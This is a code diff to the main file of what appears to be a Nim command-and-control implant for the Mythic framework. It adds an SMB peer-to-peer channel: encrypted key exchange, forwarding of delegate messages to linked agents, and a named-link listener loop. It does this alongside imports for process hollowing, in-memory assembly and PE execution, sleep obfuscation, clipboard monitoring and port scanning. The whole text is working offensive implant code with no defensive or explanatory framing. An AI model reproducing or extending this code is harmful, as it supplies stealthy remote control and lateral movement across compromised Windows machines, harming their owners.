@@ -40,8 +40,9 @@ import tasks/netstat
 import tasks/config as taskConfig
 import tasks/pkill
 
-# Windows-only commands
 when defined(windows):
+  import tasks/link
+  import profiles/smb_profile
   import tasks/execute_assembly
   import tasks/inline_execute
   import tasks/powerpick
@@ -70,9 +71,6 @@ when defined(windows):
   import tasks/donut
   import tasks/inject_hollow
   import tasks/run_pe
-
-# Conditional imports for Windows-only features
-when defined(windows):
   when defined(sleepObfuscationEkko):
     import utils/ekko
 
@@ -93,7 +91,7 @@ type
     mtClipboardMonitor, mtPortscan
   
   ProfileKind = enum
-    pkHttp, pkWebSocket, pkHttpx, pkDns, pkTcp
+    pkHttp, pkWebSocket, pkHttpx, pkDns, pkTcp, pkSmb
   
   Profile = object
     case kind: ProfileKind
@@ -107,6 +105,9 @@ type
       dnsProfile: DnsProfile
     of pkTcp:
       tcpProfile: TcpProfile
+    of pkSmb:
+      when defined(windows):
+        smbProfile: SmbProfile
   
   Agent* = ref object
     config: Config
@@ -132,6 +133,9 @@ proc send(profile: var Profile, data: string, callbackUuid: string = ""): string
     result = profile.dnsProfile.send(data, callbackUuid)
   of pkTcp:
     result = profile.tcpProfile.send(data, callbackUuid)
+  of pkSmb:
+    when defined(windows):
+      result = profile.smbProfile.send(data, callbackUuid)
 
 proc setAesKey(profile: var Profile, key: seq[byte]) =
   case profile.kind
@@ -145,6 +149,9 @@ proc setAesKey(profile: var Profile, key: seq[byte]) =
     profile.dnsProfile.setAesKey(key)
   of pkTcp:
     profile.tcpProfile.setAesKey(key)
+  of pkSmb:
+    when defined(windows):
+      profile.smbProfile.setAesKey(key)
 
 proc setAesDecKey(profile: var Profile, key: seq[byte]) =
   case profile.kind
@@ -158,6 +165,9 @@ proc setAesDecKey(profile: var Profile, key: seq[byte]) =
     profile.dnsProfile.setAesDecKey(key)
   of pkTcp:
     profile.tcpProfile.setAesDecKey(key)
+  of pkSmb:
+    when defined(windows):
+      profile.smbProfile.setAesDecKey(key)
 
 proc hasAesKey(profile: Profile): bool =
   case profile.kind
@@ -171,6 +181,9 @@ proc hasAesKey(profile: Profile): bool =
     result = profile.dnsProfile.hasAesKey()
   of pkTcp:
     result = profile.tcpProfile.hasAesKey()
+  of pkSmb:
+    when defined(windows):
+      result = profile.smbProfile.hasAesKey()
 
 proc performKeyExchange(profile: var Profile): tuple[success: bool, newUuid: string] =
   case profile.kind
@@ -184,6 +197,9 @@ proc performKeyExchange(profile: var Profile): tuple[success: bool, newUuid: str
     result = profile.dnsProfile.performKeyExchange()
   of pkTcp:
     result = profile.tcpProfile.performKeyExchange()
+  of pkSmb:
+    when defined(windows):
+      result = profile.smbProfile.performKeyExchange()
 
 proc newAgent*(): Agent =
   ## Create a new agent instance
@@ -205,6 +221,12 @@ proc newAgent*(): Agent =
     result.profile = Profile(kind: pkDns, dnsProfile: newDnsProfile())
   of "tcp":
     result.profile = Profile(kind: pkTcp, tcpProfile: newTcpProfile())
+  of "smb":
+    when defined(windows):
+      result.profile = Profile(kind: pkSmb, smbProfile: newSmbProfile())
+    else:
+      debug "[ERROR] SMB profile is only supported on Windows"
+      quit(1)
   else:  # Default to HTTP for "http" or any other value
     result.profile = Profile(kind: pkHttp, httpProfile: newHttpProfile())
   
@@ -393,9 +415,14 @@ proc processDelegates*(agent: var Agent, delegates: seq[JsonNode]) =
         let message = delegate[obf("message")].getStr()
         debug "[DEBUG] Delegate message for linked agent: ", uuid
         
-        # Try to forward to connect connection
+        # Try to forward to connect connection (TCP)
         if not forwardDelegateToConnect(uuid, message):
-          debug "[DEBUG] Failed to forward delegate to agent ", uuid, " - no active connection"
+          # Try to forward to link connection (SMB - Windows only)
+          when defined(windows):
+            if not forwardDelegateToLink(uuid, message):
+              debug "[DEBUG] Failed to forward delegate to agent ", uuid, " - no active connection"
+          else:
+            debug "[DEBUG] Failed to forward delegate to agent ", uuid, " - no active connection"
       else:
         debug "[DEBUG] Malformed delegate message - missing uuid or message"
 
@@ -695,7 +722,12 @@ proc postResponses*(agent: var Agent) =
           let delegateMessage = delegate[obf("message")].getStr()
           debug "[DEBUG] Received delegate for ", delegateUuid, " (", delegateMessage.len, " bytes base64)"
           
-          # Check if Mythic assigned a new UUID (happens on checkin response)
+          # Forward delegate message to the P2P agent FIRST (using old UUID)
+          discard forwardDelegateToConnect(delegateUuid, delegateMessage)
+          when defined(windows):
+            discard forwardDelegateToLink(delegateUuid, delegateMessage)
+          
+          # THEN check if Mythic assigned a new UUID and re-key for future messages
           if delegate.hasKey(obf("new_uuid")) or delegate.hasKey(obf("mythic_uuid")):
             let newUuid = if delegate.hasKey(obf("new_uuid")): 
               delegate[obf("new_uuid")].getStr() 
@@ -704,18 +736,11 @@ proc postResponses*(agent: var Agent) =
             
             if newUuid != delegateUuid:
               debug "[DEBUG] Mythic assigned new UUID: ", newUuid, " (old: ", delegateUuid, ")"
-              # Re-key the connection from old UUID to new UUID
+              debug "[DEBUG] Re-keying connection for future messages"
+              # Re-key the connection from old UUID to new UUID for future messages
               discard rekeyConnectConnection(delegateUuid, newUuid)
-          
-          # Forward to the connect task handler (using potentially updated UUID)
-          let targetUuid = if delegate.hasKey(obf("new_uuid")): 
-            delegate[obf("new_uuid")].getStr() 
-          elif delegate.hasKey(obf("mythic_uuid")):
-            delegate[obf("mythic_uuid")].getStr()
-          else:
-            delegateUuid
-          
-          discard forwardDelegateToConnect(targetUuid, delegateMessage)
+              when defined(windows):
+                discard rekeyLinkConnection(delegateUuid, newUuid)
       
       if respJson.hasKey(obf("responses")):
         for taskResp in respJson[obf("responses")]:
@@ -983,7 +1008,7 @@ proc runAgent*() =
   # Initialize agent
   var agentInstance = newAgent()
   
-  # TCP profile is special - it runs its own listener loop instead of normal agent loop
+  # TCP and SMB profiles are special - they run their own listener loops instead of normal agent loop
   if cfg.profile == "tcp":
     debug "[DEBUG] runAgent: TCP profile detected, starting P2P listener"
     # TCP profile doesn't do normal checkin - clients connect to it
@@ -993,6 +1018,18 @@ proc runAgent*() =
       waitFor agentInstance.profile.tcpProfile.start()
     else:
       discard
+    return
+  
+  if cfg.profile == "smb":
+    when defined(windows):
+      debug "[DEBUG] runAgent: SMB profile detected, starting P2P listener"
+      # SMB profile doesn't do normal checkin - clients connect to it
+      # Run the SMB listener loop
+      case agentInstance.profile.kind
+      of pkSmb:
+        agentInstance.profile.smbProfile.start()
+      else:
+        discard
     return
   
   debug "[DEBUG] runAgent: Agent instance created, starting checkin..."
@@ -1043,6 +1080,12 @@ proc runAgent*() =
     let connectResponses = checkActiveConnectConnections()
     for response in connectResponses:
       agentInstance.taskResponses.add(response)
+    
+    # Check active link connections for data (non-blocking via threads) - Windows only
+    when defined(windows):
+      let linkResponses = checkActiveLinkConnections()
+      for response in linkResponses:
+        agentInstance.taskResponses.add(response)
     
     # Check background tasks (clipboard_monitor, portscan)
     agentInstance.checkBackgroundTasks()
